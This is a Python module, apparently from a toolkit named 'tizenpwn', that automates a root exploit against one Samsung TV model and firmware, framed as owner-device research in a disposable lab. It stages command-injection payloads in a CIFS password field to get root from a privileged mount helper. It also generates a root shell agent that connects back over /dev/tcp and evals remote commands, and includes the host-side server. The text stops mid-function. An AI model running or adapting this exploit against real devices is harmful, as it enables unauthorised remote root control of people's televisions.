"""TU7000 T-KTSU2AKUC-2743.0 Remote PC/CIFS one-shot root route.

This route is bound to one owner-observed target: an UN65TU7000FXZA running
build T-KTSU2AKUC-REL-202607021959 (release T-KTSU2AKUC-2743.0). It uses the
SDB package-name foothold only for read-only assessment and for the two-push
UID-0 classifier. Root command execution comes from the reviewed Remote PC
privileged CIFS helper on the TV; it is triggered by one manual Shared Folder
action in an RDP session against a disposable host lab.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import ipaddress
import json
import os
import re
import secrets
import select
import socket
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path, PurePosixPath

from .compatibility import (
    TU7000_PROFILE,
    TargetAssessment,
    TargetCompatibilityError,
)
from .sdb import SdbClient, SdbError, find_sdb, route_callback_host


MODEL = "UN65TU7000FXZA"
FIRMWARE = "T-KTSU2AKUC-2743.0"
TESTED_BUILD = "T-KTSU2AKUC-REL-202607021959"
CONFIRMATION = "TU7000-T-KTSU2AKUC-2743.0"
LAB_USER = "owner"
STAGING_DIRECTORY = PurePosixPath("/home/owner/share/tmp")
SDK_STAGING_DIRECTORY = PurePosixPath("/home/owner/share/tmp/sdk_tools")
DEFAULT_RDP_PORT = 3389
DEFAULT_SMB_PORT = 445
DEFAULT_SDB_TIMEOUT = 30.0
DEFAULT_ACCEPT_TIMEOUT = 600.0
DEFAULT_AGENT_TIMEOUT = 30.0
DEFAULT_LAB_TIMEOUT = 900.0
IMAGE_LABEL = "org.tizenpwn.cifs-lab"
AGENT_PATH_PREFIX = "/home/owner/share/tmp/sdk_tools/a"
AGENT_PASSWORD_PATTERN = (
    r':;bash\$IFS-c\$IFS"\$\(cat\$IFS/home/owner/share/tmp/sdk_tools/'
    r'a[0-9a-f]{8}\)"'
)

# Exact reviewed TU7000 2743.0 artifacts. These hashes were observed on the
# owner's TV and are identical to tiz0wn's Q60T 2743.0 anchors.
ARTIFACT_HASHES = {
    "/usr/apps/privileged-service/bin/mount.smb.sh": (
        "37aaf2f05bf714332a6bf8f14b543ac9584a1b9a051341674a74fc0dd753c57e"
    ),
    "/usr/apps/privileged-service/bin/ps_agent": (
        "402885bce04ca3a04c2cb322cbe83dd96d05e17457717b4627a85b0fdb004c33"
    ),
    "/usr/apps/org.tizen.remotepc/bin/remotepc_rdp": (
        "5d5b8277b20cae7ec993be7ff8f556a5f04cdff07109beb025c0e377f4dff9e4"
    ),
    "/usr/apps/org.tizen.remotepc/bin/remotepc_uilauncher": (
        "b87e23127fe04cfab9e2c43468a99a4c4aa0b852fd5923de17104c3cf9d872da"
    ),
}
SYSTEM_FILES = (
    "/etc/passwd",
    "/usr/share/sdbd/public.pem",
    *ARTIFACT_HASHES,
)
SYSTEM_HASH_COMMAND = "sha256sum " + " ".join(SYSTEM_FILES)
ARTIFACT_HASH_COMMAND = "sha256sum " + " ".join(ARTIFACT_HASHES)
PROBE_COMMAND = (
    TU7000_PROFILE.probe_command() + ";" + ARTIFACT_HASH_COMMAND
)

LAB_CONTEXT_FILES = (
    "Dockerfile",
    "client.py",
    "client.sh",
    "entrypoint.sh",
    "healthcheck.sh",
    "server.py",
    "startwm.sh",
    "xrdp-sesman.pam",
)


class CifsRouteError(RuntimeError):
    pass


@dataclass(frozen=True)
class ArtifactVerification:
    path: str
    expected: str
    observed: str | None

    @property
    def verified(self) -> bool:
        return self.observed == self.expected


@dataclass(frozen=True)
class Tu7000Assessment:
    model: str
    compatibility: TargetAssessment
    artifacts: tuple[ArtifactVerification, ...]
    system_hashes: str

    def render(self) -> str:
        lines = [
            self.compatibility.render(),
            f"Model: {self.model}",
            f"Firmware: {FIRMWARE}",
        ]
        for artifact in self.artifacts:
            state = "verified" if artifact.verified else "mismatch"
            lines.append(f"Artifact: {artifact.path} {state} ({artifact.expected})")
        return "\n".join(lines)

    def to_dict(self) -> dict[str, object]:
        return {
            "model": self.model,
            "firmware": FIRMWARE,
            "status": self.compatibility.status.value,
            "build": self.compatibility.fingerprint.build_id,
            "kernel": self.compatibility.fingerprint.kernel_release,
            "architecture": self.compatibility.fingerprint.architecture,
            "tizen": self.compatibility.fingerprint.tizen_release,
            "capabilities": sorted(self.compatibility.fingerprint.capabilities),
            "artifacts": {
                artifact.path: {
                    "expected_sha256": artifact.expected,
                    "observed_sha256": artifact.observed,
                    "verified": artifact.verified,
                }
                for artifact in self.artifacts
            },
            "system_hashes": self.system_hashes,
        }


@dataclass(frozen=True)
class CifsRunIdentity:
    run_id: str
    marker: str
    share: str
    stage: str
    container: str

    @property
    def password(self) -> str:
        return f"$(/usr/bin/id>{self.marker})"

    @property
    def client_container(self) -> str:
        return self.container + "-client"


def fresh_identity() -> CifsRunIdentity:
    run_id = secrets.token_hex(8)
    marker = str(STAGING_DIRECTORY / ("sr-" + secrets.token_hex(6)))
    share = "TVROOT" + secrets.token_hex(4).upper()
    stage = str(SDK_STAGING_DIRECTORY / ("r" + secrets.token_hex(8)))
    identity = CifsRunIdentity(
        run_id=run_id,
        marker=marker,
        share=share,
        stage=stage,
        container="tizenpwn-cifs-" + run_id,
    )
    _validate_identity(identity)
    return identity


def _validate_identity(identity: CifsRunIdentity) -> None:
    if re.fullmatch(r"[0-9a-f]{16}", identity.run_id) is None:
        raise CifsRouteError("invalid one-shot run identifier")
    if re.fullmatch(
        r"/home/owner/share/tmp/sr-[0-9a-f]{12}", identity.marker
    ) is None:
        raise CifsRouteError("invalid one-shot marker path")
    if re.fullmatch(r"TVROOT[0-9A-F]{8}", identity.share) is None:
        raise CifsRouteError("invalid one-shot share name")
    if re.fullmatch(
        r"/home/owner/share/tmp/sdk_tools/r[0-9a-f]{16}", identity.stage
    ) is None:
        raise CifsRouteError("invalid one-shot staging path")
    if re.fullmatch(
        r"tizenpwn-cifs-[0-9a-f]{16}", identity.container
    ) is None:
        raise CifsRouteError("invalid one-shot container name")


def uid0_predicate(identity: CifsRunIdentity) -> str:
    _validate_identity(identity)
    return (
        f"[ -f {identity.marker} ]&&"
        f"[ \"$(stat -c %u {identity.marker})\" = 0 ]&&"
        f"grep -q '^uid=0(root) gid=0(root)' {identity.marker}&&"
        f"mkdir {identity.stage}"
    )


@dataclass(frozen=True)
class AgentRunIdentity:
    run_id: str
    path: str
    share: str
    container: str
    secret: str

    @property
    def password(self) -> str:
        return f':;bash$IFS-c$IFS"$(cat$IFS{self.path})"'

    @property
    def client_container(self) -> str:
        return self.container + "-client"


def fresh_agent_identity() -> AgentRunIdentity:
    run_id = secrets.token_hex(8)
    identity = AgentRunIdentity(
        run_id=run_id,
        path=AGENT_PATH_PREFIX + secrets.token_hex(4),
        share="TVROOT" + secrets.token_hex(4).upper(),
        container="tizenpwn-cifs-" + run_id,
        secret=secrets.token_hex(16),
    )
    _validate_agent_identity(identity)
    return identity


def _validate_agent_identity(identity: AgentRunIdentity) -> None:
    if re.fullmatch(r"[0-9a-f]{16}", identity.run_id) is None:
        raise CifsRouteError("invalid one-shot run identifier")
    if re.fullmatch(
        r"/home/owner/share/tmp/sdk_tools/a[0-9a-f]{8}", identity.path
    ) is None:
        raise CifsRouteError("invalid agent data path")
    if re.fullmatch(r"TVROOT[0-9A-F]{8}", identity.share) is None:
        raise CifsRouteError("invalid one-shot share name")
    if re.fullmatch(
        r"tizenpwn-cifs-[0-9a-f]{16}", identity.container
    ) is None:
        raise CifsRouteError("invalid one-shot container name")
    if re.fullmatch(r"[0-9a-f]{32}", identity.secret) is None:
        raise CifsRouteError("invalid agent secret")
    if re.fullmatch(AGENT_PASSWORD_PATTERN, identity.password) is None:
        raise CifsRouteError("invalid agent password")


def _validate_lab_identity(
    identity: CifsRunIdentity | AgentRunIdentity,
) -> None:
    if isinstance(identity, AgentRunIdentity):
        _validate_agent_identity(identity)
    else:
        _validate_identity(identity)


def agent_code(
    identity: AgentRunIdentity,
    callback_host: str,
    callback_port: int,
) -> str:
    _validate_agent_identity(identity)
    ipaddress.IPv4Address(callback_host)
    if not 0 < callback_port < 65536:
        raise CifsRouteError("invalid agent callback port")
    return (
        f'exec 3<>/dev/tcp/{callback_host}/{callback_port} || exit 1\n'
        'IFS= read -r nonce <&3\n'
        f'digest=$(printf \'%s%s\' "$nonce" "{identity.secret}" '
        "| sha256sum | cut -d' ' -f1)\n"
        'printf \'%s\\n\' "$digest" >&3\n'
        'printf \'IDENTITY %s\\n\' "$(id)" >&3\n'
        'while IFS= read -r line <&3; do\n'
        '    [ "$line" = "__EXIT__" ] && break\n'
        '    cmd=$(printf \'%s\' "$line" | base64 -d)\n'
        '    output=$({ eval "$cmd"; } 2>&1)\n'
        "    status=$?\n"
        '    printf \'RESULT %s %s\\n\' "$status" '
        '"$(printf \'%s\' "$output" | base64 -w0)" >&3\n'
        'done\n'
        'exec 3>&-\n'
    )


def _capture(client: SdbClient, command: str, timeout: float) -> str:
    result = client.capture(command, timeout=timeout)
    if "[exit:0]" not in result.output:
        raise CifsRouteError(
            f"TV command failed: {command}: {result.output.strip()}"
        )
    return result.output.split("\n[exit:0]", 1)[0].strip()


def _parse_hashes(output: str) -> dict[str, str]:
    hashes: dict[str, str] = {}
    for line in output.splitlines():
        match = re.fullmatch(r"([0-9a-f]{64})[ \t]+(\S+)", line.strip())
        if match:
            hashes[match.group(2)] = match.group(1)
    return hashes


def assess_target(
    tv_host: str,
    *,
    sdb_timeout: float = DEFAULT_SDB_TIMEOUT,
    client: SdbClient | None = None,
    require_tested: bool = True,
) -> Tu7000Assessment:
    ipaddress.IPv4Address(tv_host)
    client = client or SdbClient(find_sdb(), tv_host, timeout=sdb_timeout)
    client.connect()
    client.require_device()
    model = client.reported_model()
    if model != MODEL:
        raise CifsRouteError(
            f"target reports model {model or 'unknown'}, expected {MODEL}"
        )
    client.require_shell_injection()
    output = _capture(client, PROBE_COMMAND, sdb_timeout)
    assessment = TU7000_PROFILE.assess(output)
    try:
        assessment.require_compatible()
        if require_tested:
            assessment.require_tested("TU7000 CIFS route")
    except TargetCompatibilityError as error:
        raise CifsRouteError(str(error)) from error
    observed = _parse_hashes(output)
    artifacts = tuple(
        ArtifactVerification(path, expected, observed.get(path))
        for path, expected in ARTIFACT_HASHES.items()
    )
    mismatched = [artifact.path for artifact in artifacts if not artifact.verified]
    if mismatched:
        raise CifsRouteError(
            "reviewed TU7000 artifact hashes did not match: " + ", ".join(mismatched)
        )
    system_hashes = _capture(client, SYSTEM_HASH_COMMAND, sdb_timeout)
    return Tu7000Assessment(
        model=model,
        compatibility=assessment,
        artifacts=artifacts,
        system_hashes=system_hashes,
    )


def classify_uid0_once(
    client: SdbClient,
    identity: CifsRunIdentity,
    *,
    timeout: float = DEFAULT_SDB_TIMEOUT,
) -> bool:
    """Run the combined predicate once, then perform exactly two SDB pushes."""
    _validate_identity(identity)
    try:
        client.inject(uid0_predicate(identity), timeout=timeout)
    except SdbError as error:
        raise CifsRouteError(
            "classification injection failed or timed out; do not retry"
        ) from error
    with tempfile.TemporaryDirectory(prefix="tizenpwn-classifier-") as temp:
        local_marker = Path(temp) / "attest"
        local_marker.write_bytes(secrets.token_bytes(32))
        os.chmod(local_marker, 0o600)
        try:
            client.push(local_marker, PurePosixPath(identity.stage))
        except SdbError as error:
            raise CifsRouteError(
                "first classification push failed; classification is terminal"
            ) from error
        try:
            client.push(
                local_marker,
                PurePosixPath(identity.stage) / "attest",
            )
        except SdbError as error:
            text = str(error)
            if (
                ": Not a directory" in text
                or ": No such file or directory" in text
            ):
                return False
            raise CifsRouteError(
                "unexpected second classification result; classification is terminal"
            ) from error
    return True


def read_root_identity(client: SdbClient, identity: CifsRunIdentity) -> str:
    output = _capture(client, f"cat {identity.marker}", DEFAULT_SDB_TIMEOUT)
    if re.match(r"^uid=0\(root\) gid=0\(root\)", output) is None:
        raise CifsRouteError(
            "fresh marker did not begin with uid=0(root) gid=0(root)"
        )
    return output


def cleanup_target(client: SdbClient, identity: CifsRunIdentity) -> bool:
    _validate_identity(identity)
    try:
        client.inject(
            f"/bin/rm -f {identity.marker};/bin/rm -rf {identity.stage}",
            timeout=DEFAULT_SDB_TIMEOUT,
        )
    except SdbError as error:
        raise CifsRouteError("target cleanup injection failed") from error
    output = _capture(
        client,
        f"test ! -e {identity.marker} && test ! -e {identity.stage} "
        "&& echo absent",
        DEFAULT_SDB_TIMEOUT,
    )
    return output == "absent"


@dataclass(frozen=True)
class RunnerResult:
    returncode: int
    stdout: str
    stderr: str


class Runner:
    def run(
        self,
        arguments: tuple[str, ...],
        *,
        timeout: float,
        check: bool = True,
        input_text: str | None = None,
    ) -> RunnerResult:
        try:
            completed = subprocess.run(
                arguments,
                text=True,
                capture_output=True,
                timeout=timeout,
                check=False,
                input=input_text,
            )
        except FileNotFoundError as error:
            raise CifsRouteError(
                f"required host command was not found: {arguments[0]}"
            ) from error
        except subprocess.TimeoutExpired as error:
            raise CifsRouteError(
                f"host command timed out after {timeout:g}s: {arguments[0]}"
            ) from error
        result = RunnerResult(
            returncode=completed.returncode,
            stdout=completed.stdout or "",
            stderr=completed.stderr or "",
        )
        if check and result.returncode != 0:
            detail = (result.stderr or result.stdout).strip()
            raise CifsRouteError(
                f"host command failed: {' '.join(arguments[:3])}"
                + (f": {detail}" if detail else "")
            )
        return result


def lab_context_directory() -> Path:
    configured = os.environ.get("TIZENPWN_TU7000_LAB_DIRECTORY")
    if configured:
        return Path(configured).expanduser().resolve()
    if getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
        return Path(vars(sys)["_MEIPASS"]) / "payloads" / "tu7000" / "cifs-lab"
    return (
        Path(__file__).resolve().parents[2]
        / "payloads"
        / "tu7000"
        / "cifs-lab"
    )


def lab_context_sha256(directory: Path | None = None) -> str:
    directory = directory or lab_context_directory()
    digest = hashlib.sha256()
    for name in sorted(LAB_CONTEXT_FILES):
        path = directory / name
        if not path.is_file() or path.is_symlink():
            raise CifsRouteError(f"missing or unsafe lab context file: {path}")
        data = path.read_bytes()
        digest.update(name.encode("ascii"))
        digest.update(b"\0")
        digest.update(len(data).to_bytes(8, "big"))
        digest.update(data)
    return digest.hexdigest()


def port_available(address: str, port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            listener.bind((address, port))
        except PermissionError:
            # SMB port 445 is privileged. The unprivileged precheck cannot
            # bind it even when it is free; the Docker daemon performs the
            # real bind and start() reports a genuine conflict.
            return True
        except OSError:
            return False
    return True


def require_ports_available(address: str, ports: tuple[int, ...]) -> None:
    busy = [port for port in ports if not port_available(address, port)]
    if busy:
        raise CifsRouteError(
            f"lab ports already occupied on {address}: "
            + ", ".join(str(port) for port in busy)
        )


def port_open(address: str, port: int, *, timeout: float = 0.3) -> bool:
    try:
        with socket.create_connection((address, port), timeout=timeout):
            return True
    except OSError:
        return False


def require_ports_closed(
    address: str,
    ports: tuple[int, ...],
    *,
    timeout: float = 8.0,
) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if not any(port_open(address, port) for port in ports):
            return
        time.sleep(0.2)
    raise CifsRouteError(
        f"lab ports remained open on {address}: "
        + ", ".join(str(port) for port in ports)
    )


RDP_NEGOTIATION_REQUEST = bytes.fromhex(
    "030000130ee000000000000100080003000000"
)


def rdp_protocol_selftest(address: str, port: int) -> None:
    try:
        with socket.create_connection((address, port), timeout=5) as connection:
            connection.sendall(RDP_NEGOTIATION_REQUEST)
            response = connection.recv(64)
    except OSError as error:
        raise CifsRouteError("local RDP protocol self-test failed") from error
    if len(response) < 11 or response[:2] != b"\x03\x00" or response[5] != 0xD0:
        raise CifsRouteError(
            "local RDP service returned an unexpected negotiation response"
        )


class CifsLab:
    def __init__(
        self,
        identity: CifsRunIdentity | AgentRunIdentity,
        *,
        bind: str,
        rdp_port: int,
        smb_port: int,
        image: str | None = None,
        runner: Runner | None = None,
    ) -> None:
        _validate_lab_identity(identity)
        ipaddress.IPv4Address(bind)
        if bind == "0.0.0.0":
            raise CifsRouteError(
                "the disposable lab must bind one concrete host address"
            )
        self.identity = identity
        self.bind = bind
        self.rdp_port = rdp_port
        self.smb_port = smb_port
        self.runner = runner or Runner()
        self.context_sha256 = lab_context_sha256()
        self.image = image or (
            "tizenpwn-cifs-lab:" + self.context_sha256[:12]
        )
        self._temporary: tempfile.TemporaryDirectory[str] | None = None
        self._cleanup_armed = False
        self._image_id: str | None = None
        self._rdp_login_baseline = 0

    @property
    def client_container(self) -> str:
        return self.identity.client_container

    def build(self, *, force: bool = False) -> None:
        self._image_id = None
        if not force:
            cached = self._cached_image_id()
            if cached is not None:
                self._image_id = cached
                return
        with tempfile.TemporaryDirectory(prefix="tizenpwn-cifs-context-") as temp:
            snapshot = Path(temp)
            for relative in LAB_CONTEXT_FILES:
                source = lab_context_directory() / relative
                if not source.is_file() or source.is_symlink():
                    raise CifsRouteError(
                        "lab build context contains a missing or unsafe source file"
                    )
                (snapshot / relative).write_bytes(source.read_bytes())
            snapshot_digest = lab_context_sha256(snapshot)
            if lab_context_sha256() != snapshot_digest:
                raise CifsRouteError(
                    "lab source changed while its build snapshot was created"
                )
            self.context_sha256 = snapshot_digest
            result = self.runner.run(
                (
                    "docker",
                    "build",
                    "--quiet",
                    "--label",
                    f"{IMAGE_LABEL}={self.context_sha256}",
                    "--tag",
                    self.image,
                    str(snapshot),
                ),
                timeout=DEFAULT_LAB_TIMEOUT,
            )
            if lab_context_sha256() != snapshot_digest:
                raise CifsRouteError(
                    "lab source changed while its image was built"
                )
        image_id = result.stdout.strip()
        if re.fullmatch(r"sha256:[0-9a-f]{64}", image_id) is None:
            raise CifsRouteError(
                "Docker did not return an immutable lab image ID"
            )
        self._image_id = self._verified_image_id(image_id)

    def _cached_image_id(self) -> str | None:
        result = self.runner.run(
            ("docker", "image", "inspect", self.image),
            timeout=15,
            check=False,
        )
        if result.returncode != 0:
            return None
        return self._verified_image_id(self.image, required=False)

    def _verified_image_id(
        self,
        value: str,
        *,
        required: bool = True,
    ) -> str | None:
        result = self.runner.run(
            ("docker", "image", "inspect", value),
            timeout=15,
            check=False,
        )
        if result.returncode != 0 or not result.stdout.strip():
            if not required:
                return None
            raise CifsRouteError("the disposable lab image cannot be inspected")
        try:
            documents = json.loads(result.stdout)
            image_id = documents[0]["Id"]
            labels = documents[0]["Config"]["Labels"] or {}
        except (ValueError, TypeError, KeyError, IndexError) as error:
            raise CifsRouteError(
                "the disposable lab image metadata is malformed"
            ) from error
        if (
            not isinstance(image_id, str)
            or re.fullmatch(r"sha256:[0-9a-f]{64}", image_id) is None
            or labels.get(IMAGE_LABEL) != self.context_sha256
        ):
            if not required:
                return None
            raise CifsRouteError(
                "the disposable lab image is stale or not built from the "
                "current reviewed source"
            )
        return image_id

    def _write_secrets(self) -> Path:
        self._temporary = tempfile.TemporaryDirectory(
            prefix="tizenpwn-cifs-secrets-"
        )
        directory = Path(self._temporary.name)
        os.chmod(directory, 0o700)
        values = {
            "username": LAB_USER,
            "password": self.identity.password,
            "share": self.identity.share,
            "host": self.bind,
            "rdp_port": str(self.rdp_port),
            "smb_port": str(self.smb_port),
        }
        for name, value in values.items():
            path = directory / name
            path.write_text(value, encoding="utf-8")
            os.chmod(path, 0o600)
        return directory

    def start(self) -> None:
        require_ports_available(self.bind, (self.rdp_port, self.smb_port))
        self._require_container_absent(self.identity.container)
        self._require_container_absent(self.client_container)
        if self._image_id is None:
            raise CifsRouteError(
                "the disposable lab image was not built in this run"
            )
        if lab_context_sha256() != self.context_sha256:
            raise CifsRouteError("lab source changed after its image was built")
        self._image_id = self._verified_image_id(self._image_id)
        secrets_dir = self._write_secrets()
        arguments = (
            "docker",
            "run",
            "--detach",
            "--name",
            self.identity.container,
            "--hostname",
            "tizenpwn-lab",
            "--pids-limit",
            "256",
            "--publish",
            f"{self.bind}:{self.rdp_port}:3389",
            "--publish",
            f"{self.bind}:{self.smb_port}:445",
            "--mount",
            f"type=bind,source={secrets_dir},target=/run/cifs-lab-secrets,readonly",
            "--label",
            f"{IMAGE_LABEL}={self.context_sha256}",
            self._image_id,
        )
        self._cleanup_armed = True
        self.runner.run(arguments, timeout=60)
        self._wait_healthy()
        self._require_exact_publish()

    def _require_container_absent(self, name: str) -> None:
        result = self.runner.run(
            ("docker", "inspect", name), timeout=10, check=False
        )
        if result.returncode == 0:
            raise CifsRouteError(
                f"a stale disposable lab container already exists: {name}"
            )
        if not self._is_exact_absence(result, name):
            raise CifsRouteError(
                "Docker could not prove the disposable container name is unused"
            )

    @staticmethod
    def _is_exact_absence(result: RunnerResult, name: str) -> bool:
        errors = (result.stderr or "").strip().lower()
        expected = {
            f"error: no such object: {name}".lower(),
            f"error: no such container: {name}".lower(),
        }
        return (
            result.returncode != 0
            and (result.stdout or "").strip() in {"", "[]"}
            and errors in expected
        )

    def _wait_healthy(self, *, timeout: float = 60.0) -> None:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            result = self.runner.run(
                (
                    "docker",
                    "inspect",
                    "--format",
                    "{{.State.Running}} "
                    "{{if .State.Health}}{{.State.Health.Status}}"
                    "{{else}}missing{{end}}",
                    self.identity.container,
                ),
                timeout=10,
                check=False,
            )
            status = result.stdout.strip()
            if result.returncode == 0 and status == "true healthy":
                return
            if result.returncode == 0 and status.startswith("false "):
                raise CifsRouteError(
                    "disposable RDP/SMB lab exited before becoming healthy"
                )
            time.sleep(0.25)
        raise CifsRouteError(
            "disposable RDP/SMB lab did not become healthy"
        )

    def _require_exact_publish(self) -> None:
        result = self.runner.run(
            ("docker", "inspect", self.identity.container), timeout=15
        )
        try:
            ports = json.loads(result.stdout)[0]["NetworkSettings"]["Ports"]
            rdp = ports["3389/tcp"]
            smb = ports["445/tcp"]
        except (ValueError, TypeError, KeyError, IndexError) as error:
            raise CifsRouteError(
                "cannot verify disposable lab port bindings"
            ) from error
        expected = {
            (self.bind, str(self.rdp_port)),
            (self.bind, str(self.smb_port)),
        }
        observed = {
            (entry["HostIp"], entry["HostPort"]) for entry in (*rdp, *smb)
        }
        if (
            observed != expected
            or len(rdp) != 1
            or len(smb) != 1
        ):
            raise CifsRouteError(
                "disposable lab is not bound only to the configured host address"
            )

    def selftest(self) -> None:
        if self._temporary is None or self._image_id is None:
            raise CifsRouteError(
                "verified lab image or secrets are unavailable for self-test"
            )
        rdp_protocol_selftest(self.bind, self.rdp_port)
        self._require_exact_password_authentication()
        arguments = (
            "docker",
            "run",
            "--detach",
            "--rm",
            "--name",
            self.client_container,
            "--network",
            "host",
            "--mount",
            f"type=bind,source={self._temporary.name},"
            "target=/run/cifs-lab-secrets,readonly",
            "--entrypoint",
            "/usr/local/sbin/cifs-lab-client",
            self._image_id,
        )
        self.runner.run(arguments, timeout=30)
        deadline = time.monotonic() + 45
        observed = ""
        rdp_observed = ""
        while time.monotonic() < deadline:
            observed = self.logs()
            rdp_observed = self.rdp_logs()
            smb_ok = observed.count("NetrShareEnum Level: 1") == 1
            logins = self._count_rdp_logins(rdp_observed)
            rejections = self._count_rdp_rejections(rdp_observed)
            xorg_ok = (
                f"Session started successfully for user {LAB_USER}"
                in rdp_observed
                and rejections == 1
                and logins == 1
            )
            if smb_ok and xorg_ok:
                self._require_secret_absent_from_process_arguments()
                break
            client = self.runner.run(
                (
                    "docker",
                    "inspect",
                    "--format",
                    "{{.State.Running}}",
                    self.client_container,
                ),
                timeout=10,
                check=False,
            )
            if (
                client.returncode != 0
                or client.stdout.strip() != "true"
            ):
                raise CifsRouteError(
                    "full published-port RDP/SMB self-test client exited early"
                )
            time.sleep(0.25)
        else:
            raise CifsRouteError(
                "full published-port RDP/SMB self-test did not complete"
            )
        self._rdp_login_baseline = self._count_rdp_logins(rdp_observed)
        self._remove_container(self.client_container)

    def _require_exact_password_authentication(self) -> None:
        arguments = (
            "docker",
            "exec",
            "--interactive",
            self.identity.container,
            "/usr/bin/pamtester",
            "xrdp-sesman",
            LAB_USER,
            "authenticate",
        )
        wrong = self.runner.run(
            arguments,
            timeout=15,
            check=False,
            input_text="CIFS-LAB-INVALID-RDP-PASSWORD\n",
        )
        if wrong.returncode == 0:
            raise CifsRouteError(
                "the disposable XRDP PAM stack accepted an incorrect password"
            )
        exact = self.runner.run(
            arguments,
            timeout=15,
            check=False,
            input_text=self.identity.password + "\n",
        )
        if exact.returncode != 0:
            raise CifsRouteError(
                "the disposable XRDP PAM stack rejected the exact runtime password"
            )

    def _require_secret_absent_from_process_arguments(self) -> None:
        secret = self.identity.password
        for container in (self.identity.container, self.client_container):
            result = self.runner.run(
                ("docker", "top", container),
                timeout=10,
                check=False,
            )
            if result.returncode != 0:
                raise CifsRouteError(
                    "cannot inspect disposable lab process arguments"
                )
            if secret in (result.stdout or "") + "\n" + (result.stderr or ""):
                raise CifsRouteError(
                    "the runtime password appeared in a process argument"
                )

    def certificate_fingerprint(self) -> str:
        result = self.runner.run(
            (
                "docker",
                "exec",
                self.identity.container,
                "openssl",
                "x509",
                "-in",
                "/etc/xrdp/cert.pem",
                "-noout",
                "-fingerprint",
                "-sha256",
            ),
            timeout=10,
        )
        line = result.stdout.strip()
        if "=" not in line:
            raise CifsRouteError(
                "cannot obtain the disposable RDP certificate fingerprint"
            )
        value = line.split("=", 1)[1]
        if re.fullmatch(r"(?:[0-9A-F]{2}:){31}[0-9A-F]{2}", value) is None:
            raise CifsRouteError(
                "the disposable RDP certificate fingerprint is malformed"
            )
        return value

    def logs(self) -> str:
        result = self.runner.run(
            ("docker", "logs", self.identity.container),
            timeout=15,
            check=False,
        )
        if result.returncode != 0:
            raise CifsRouteError(
                "cannot read the disposable lab event window"
            )
        return result.stdout + "\n" + result.stderr

    def rdp_logs(self) -> str:
        result = self.runner.run(
            (
                "docker",
                "exec",
                self.identity.container,
                "/usr/bin/tail",
                "-c",
                "262144",
                "/var/log/xrdp.log",
                "/var/log/xrdp-sesman.log",
            ),
            timeout=15,
            check=False,
        )
        if result.returncode != 0:
            raise CifsRouteError(
                "cannot read bounded disposable RDP logs"
            )
        return result.stdout + "\n" + result.stderr

    @staticmethod
    def _count_rdp_logins(logs: str) -> int:
        return sum(
            bool(
                re.search(
                    rf"\[INFO \] login successful for user {LAB_USER} "
                    r"on display [0-9]+$",
                    line,
                )
            )
            for line in logs.splitlines()
        )

    @staticmethod
    def _count_rdp_rejections(logs: str) -> int:
        return sum(
            bool(
                re.search(
                    rf"\[INFO \] AUTHFAIL: user={LAB_USER}\b",
                    line,
                )
            )
            for line in logs.splitlines()
        )

    def require_rdp_login(self) -> None:
        observed = self._count_rdp_logins(self.rdp_logs())
        if observed != self._rdp_login_baseline + 1:
            raise CifsRouteError(
                "exactly one new successful RDP login was not observed"
            )

    def _remove_container(self, name: str) -> None:
        self.runner.run(
            ("docker", "rm", "--force", name),
            timeout=30,
            check=False,
        )
        remaining = self.runner.run(
            ("docker", "inspect", name), timeout=10, check=False
        )
        if remaining.returncode == 0:
            raise CifsRouteError(
                f"an exact-name disposable container remained: {name}"
            )
        if not self._is_exact_absence(remaining, name):
            raise CifsRouteError(
                "Docker could not prove exact-name container removal"
            )

    def stop(self) -> None:
        errors: list[BaseException] = []
        try:
            if self._cleanup_armed:
                for name in (
                    self.client_container,
                    self.identity.container,
                ):
                    try:
                        self._remove_container(name)
                    except BaseException as error:  # noqa: BLE001
                        errors.append(error)
                if not errors:
                    self._cleanup_armed = False
        finally:
            if self._temporary is not None:
                self._temporary.cleanup()
                self._temporary = None
        if errors:
            raise CifsRouteError(
                "one or more exact-name lab containers survived cleanup"
            ) from errors[0]


class AgentServer:
    """One-shot shared-secret command channel for the staged inline agent."""

    def __init__(self, bind: str, secret: str) -> None:
        ipaddress.IPv4Address(bind)
        if re.fullmatch(r"[0-9a-f]{32}", secret) is None:
            raise CifsRouteError("invalid agent secret")
        self.bind = bind
        self.secret = secret
        self._listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self._listener.bind((bind, 0))
            self._listener.listen(1)
        except OSError as error:
            self._listener.close()
            raise CifsRouteError(
                f"cannot listen for the agent callback on {bind}: {error}"
            ) from error
        self.port = int(self._listener.getsockname()[1])
        self._connection: socket.socket | None = None
        self._reader = None
        self._writer = None

    def accept_and_run(
        self,
        commands: tuple[str, ...],
        *,
        timeout: float = DEFAULT_AGENT_TIMEOUT,
    ) -> tuple[str, list[dict[str, object]]]:
        if not commands:
            raise CifsRouteError("the agent requires at least one command")
        self._listener.settimeout(timeout)
        try:
            connection, _ = self._listener.accept()
        except TimeoutError as error:
            raise CifsRouteError(
                "the TV agent did not connect to the host listener"
            ) from error
        self._connection = connection
        connection.settimeout(timeout)
        reader = connection.makefile("rb")
        writer = connection.makefile("wb")
        self._reader = reader
        self._writer = writer
        nonce = secrets.token_hex(32)
        try:
            writer.write((nonce + "\n").encode("ascii"))
            writer.flush()
            digest = self._read_line(reader)
            expected = hashlib.sha256(
                (nonce + self.secret).encode("ascii")
            ).hexdigest()
            if not hmac.compare_digest(digest, expected):
                raise CifsRouteError(
                    "the TV agent failed the shared-secret challenge"
                )
            identity_line = self._read_line(reader)
            if not identity_line.startswith("IDENTITY "):
                raise CifsRouteError(
                    "the TV agent did not send a root identity"
                )
            identity = identity_line[len("IDENTITY ") :]
            if re.match(r"^uid=0\(root\) gid=0\(root\)", identity) is None:
                raise CifsRouteError(
                    "the TV agent identity did not begin with uid=0(root)"
                )
            results: list[dict[str, object]] = []
            for command in commands:
                encoded = base64.b64encode(command.encode("utf-8")).decode(
                    "ascii"
                )
                writer.write((encoded + "\n").encode("ascii"))
                writer.flush()
                line = self._read_line(reader)
                fields = line.split(" ", 2)
                if len(fields) != 3 or fields[0] != "RESULT":
